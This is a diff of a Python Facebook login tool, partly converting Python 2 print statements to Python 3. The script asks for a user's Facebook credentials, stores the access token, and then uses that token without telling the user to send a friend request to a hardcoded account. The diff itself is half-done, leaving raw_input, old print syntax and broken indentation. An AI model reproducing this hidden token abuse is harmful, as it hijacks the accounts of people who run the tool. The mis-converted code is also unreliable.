@@ -26,11 +26,11 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.1
 #-exit-#
 def exit():
 	os.system('clear')
-	print "\033[1;91m[!] Closing the tool..."
+	print("\033[1;91m[!] Closing the tool...")
 	os.system('sleep 3 && clear')
 	os.system('xdg-open https://web.facebook.com/mkdirlove.git')
 	os.sys.exit()
-        tool_main_function()
+	tool_main_function()
 
 #-Animation-#
 def mkdir(z):
@@ -94,14 +94,14 @@ vuln = "\033[32mVuln"
 ##### choices Login #####
 def tool_main_function():
 	os.system('clear')
-	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
-	print "\033[1;97m║"
+	print (logo)
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login")
+	print ("\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login")
+	print ("\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit")
+	print ("\033[1;97m║")
 	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if login_method =="":
-		print"\033[1;91m[!] Wrong input"
+		print("\033[1;91m[!] Wrong input")
 		exit()
 	elif login_method =="1":
 		login()
@@ -110,7 +110,7 @@ def tool_main_function():
 	elif login_method =="0":
 		exit()
 	else:
-		print"\033[1;91m[!] Wrong input"
+		print("\033[1;91m[!] Wrong input")
 		exit()
 
 ##### LOGIN #####
@@ -122,7 +122,7 @@ def login():
 		menu()
 	except (KeyError,IOError):
 		os.system('clear')
-		print logo
+		print (logo)
 		print('\033[1;91m[☆] \033[1;92mFACEBOOK LOGIN \033[1;91m[☆]')
 		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
 		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
@@ -130,7 +130,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;91m[!] No connection"
+			print("\n\033[1;91m[!] No connection")
 			exit()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -152,8 +152,8 @@ def login():
 				pick = open("login.txt", 'w')
 				pick.write(z['access_token'])
 				pick.close()
-				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
-                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				print( '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully')
+            requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
